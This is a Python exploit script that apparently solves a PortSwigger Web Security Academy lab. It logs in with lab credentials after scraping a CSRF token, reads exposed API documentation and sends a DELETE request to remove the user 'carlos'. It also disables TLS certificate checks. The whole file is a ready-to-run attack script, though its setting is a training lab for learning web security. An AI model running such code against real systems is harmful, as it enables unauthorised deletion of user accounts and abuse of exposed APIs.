import requests
import urllib3
import sys
from bs4 import BeautifulSoup

# Disable SSL/TLS certificate warnings (useful when dealing with self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab: Exploiting an API endpoint using documentation
def csrf_loginTo(target_host):
    """
    Retrieves the CSRF token and session cookie by accessing the login page.
    """
    try:
        url = "https://" + target_host + "/login"
        data = requests.get(url, verify=False)  # Sending a GET request to the login page

        # Check if the host is down (504 Gateway Timeout)
        if data.status_code == 504:
            print('(!) Host down')
            sys.exit()

        # Parse the HTML response to extract the CSRF token
        soup = BeautifulSoup(data.text, "html.parser")
        csrf = soup.find("input", {"name": "csrf"})['value']  # Extract CSRF token
        session = data.cookies.values()[0]  # Extract session cookie
        
        return csrf, session
    
    except Exception as err:
        print(f'(!) {err}')
        sys.exit()  # Exit script if an error occurs

def API_Documentation(target_host, csrf, session):
    """
    Logs in using the extracted CSRF token and session cookie,
    then checks for exposed API documentation and attempts to delete user 'carlos'.
    """
    url = "https://" + target_host
    login_data = {"csrf": csrf, "username": "wiener", "password": "peter"}

    # Sending a login request with CSRF token and session cookie
    response_login = requests.post(
        url + "/login", data=login_data, cookies={"session": session}, verify=False, allow_redirects=False
    )

    # Extract the new session cookie after logging in
    new_session = response_login.cookies.values()[0]

    # If login is successful (302 Found, meaning redirect after login)
    if response_login.status_code == 302:

        # Check if the API documentation is accessible
        response = requests.get(url + "/api", verify=False)
        if "DELETE" in response.text:  # Check if the API  DELETE operations in response
            soup = BeautifulSoup(response.text, "html.parser")
            exposed_table = soup.find("table", {"class": "table table-hover"})

            print("(+) Documentation Found.")
            # Print the extracted API documentation in a readable format
            for row in exposed_table.find_all('tr'):
                print(" | ".join(cell.get_text(strip=True) for cell in row.find_all(['th', 'td'])))

            print('(+) Deleting user carlos ..... ')
            
            # Sending a DELETE request to remove user 'carlos'
            delete_url = "https://" + target_host + "/api/user/carlos"
            delete_response = requests.delete(delete_url, verify=False, cookies={"session": new_session})

            # Check if deletion was successful
            if "User deleted" in delete_response.text:
                print('(+) User deleted successfully.')
            else:
                print('(!) Error.')
                sys.exit()
        else:
            print('(!) Error: API documentation not found or DELETE method missing.')
            sys.exit()

def main():
    """
    Main function that verifies input arguments and initiates the attack.
    """
    if len(sys.argv) != 2:
        print('(!) Usage: %s <url>' % sys.argv[0])
        print('(!) Example: %s xxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net' % sys.argv[0])
        sys.exit()

    target_host = sys.argv[1]
    csrf, session = csrf_loginTo(target_host)  # Retrieve CSRF token and session
    API_Documentation(target_host, csrf, session)  # Perform API exploitation

# Run the script if executed directly
if __name__ == "__main__":
    main()

